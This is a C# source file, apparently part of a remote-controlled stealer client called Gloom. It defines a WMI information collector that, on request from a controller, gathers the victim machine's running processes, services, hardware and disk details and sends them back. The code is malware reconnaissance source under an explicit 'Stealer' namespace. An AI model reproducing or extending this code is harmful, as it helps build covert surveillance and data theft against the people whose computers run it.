using Gloom.WmiOps;

namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
public class WmiInfoCollector : FeatureBase
{
	public override Guid[] AcceptedOps => new Guid[] { OpCodes.WmiInfoRequest };
	private readonly IReadOnlySet<WmiInfo> registry = new HashSet<WmiInfo>()
	{
		new WmiProcessList(),
		new WmiServiceList(),
		new WmiHardwareInfo(),
		new WmiDiskInfo()
	};

	public WmiInfoCollector(IMessageSender sender) : base(sender) { }

	public override async Task HandleAsync(Guid op, byte[] data)
	{
		WmiInfoRequest req = StructConvert.Bytes2Struct<WmiInfoRequest>(data);
		foreach (WmiInfo wi in registry.Where(r => r.WmiOp == req.WmiOp))
			await SendAsync(OpCodes.WmiInfoResponse, new WmiInfoResponse { WmiOp = wi.WmiOp, Data = StructConvert.Struct2Bytes(wi.Collect()) }, true);
	}
}
